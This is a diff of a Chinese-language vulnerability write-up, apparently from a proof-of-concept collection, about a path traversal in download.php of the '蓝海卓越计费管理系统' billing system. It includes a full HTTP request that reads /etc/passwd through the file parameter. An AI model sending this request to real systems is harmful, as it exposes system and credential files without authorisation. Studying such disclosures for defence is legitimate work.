@@ -20,21 +20,13 @@ title=="蓝海卓越计费管理系统"
 
 登录页面如下
 
-
-
-![](images/202202101852354.png)
-
-
+![](../.gitbook/assets/202202101852354.png)
 
 出现漏洞的文件为 download.php ，其中 file参数 存在用户可控
 
-
-
 发送如下请求包
 
-
-
-```plain
+```
 GET /download.php?file=../../../../../etc/passwd HTTP/1.1
 Host: 
 Cache-Control: max-age=0
@@ -48,8 +40,6 @@ Cookie: PHPSESSID=qkoqsiilc4dol8s4e9d7ta15g7; mylang=zh_s
 Connection: close
 ```
 
+![](../.gitbook/assets/202202101852942.png)
 
-
-![](images/202202101852942.png)
-
-## 
+##
